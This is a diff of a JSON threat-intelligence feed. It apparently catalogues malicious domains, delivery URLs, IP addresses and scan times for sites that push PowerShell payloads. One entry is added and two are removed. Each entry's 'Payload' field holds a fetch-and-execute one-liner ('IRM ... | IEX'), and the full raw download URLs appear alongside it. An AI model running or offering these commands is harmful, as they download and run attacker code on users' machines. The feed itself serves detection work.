@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "aipas.fit",
+    "DeliveryUrl": [
+      "biboiboboorl.org"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "69.163.142.38"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwhxb9mz0uf80omljhjnf4kl",
+    "ScannedAt": "2026-11-15T14:22:02.682000+00:00"
+  },
+  {
     "UrlDomain": "tccgcc.com",
     "DeliveryUrl": [
       "browse-cloud.codes",
@@ -10401,44 +10423,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmw9g2kme00et0omlszyw2f1j",
     "ScannedAt": "2026-11-09T15:57:14.031000+00:00"
-  },
-  {
-    "UrlDomain": "ai.support.studyway.ai",
-    "DeliveryUrl": [
-      "gl.githack.com"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "180.93.172.36"
-    ],
-    "Related": [
-      {
-        "Value": "n",
-        "Type": "Hostname"
-      }
-    ],
-    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
-    ],
-    "ReportId": "cmw9cf1pj2iv80oml75c467mf",
-    "ScannedAt": "2026-11-09T14:14:57.713000+00:00"
-  },
-  {
-    "UrlDomain": "asyncmove.com",
-    "DeliveryUrl": [
-      "gl.githack.com"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "37.60.252.205"
-    ],
-    "Related": [],
-    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
-    ],
-    "ReportId": "cmw9cew5j2iui0omli3epud81",
-    "ScannedAt": "2026-11-09T14:14:50.453000+00:00"
   }
 ]
